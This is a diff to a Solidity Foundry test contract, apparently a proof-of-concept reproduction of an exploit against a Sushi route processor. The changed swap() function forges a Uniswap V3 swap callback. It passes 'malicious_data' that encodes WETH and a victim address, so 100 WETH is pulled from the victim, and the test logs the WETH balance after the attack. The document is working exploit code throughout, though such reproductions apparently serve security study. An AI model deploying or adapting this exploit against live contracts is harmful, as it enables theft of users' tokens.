@@ -96,19 +96,7 @@ contract SushiExp is Test, IUniswapV3Pool {
         console.log("WETH balance after  attack: %d\n", WETH.balanceOf(address(this)));
     }
 
-    function uniswapV3SwapCallback(
-      int256 amount0Delta,
-      int256 amount1Delta,
-      bytes calldata data
-    ) public {
-
-      bytes memory malicious_data = abi.encode(address(WETH), victim);
-      processor.tridentCLSwapCallback(
-        100 * 10 ** 18,
-        0,
-        malicious_data
-      );
-    }
+    
 
   function swap(
     address recipient,
@@ -117,8 +105,14 @@ contract SushiExp is Test, IUniswapV3Pool {
     uint160 sqrtPriceLimitX96,
     bytes calldata data
   ) external returns (int256 amount0, int256 amount1) {
-    uniswapV3SwapCallback(0, 0, data);
+    
     amount0 = 0;
     amount1 = 0;
+    bytes memory malicious_data = abi.encode(address(WETH), victim);
+      processor.uniswapV3SwapCallback(
+        100 * 10 ** 18,
+        0,
+        malicious_data
+      );
   }
 }
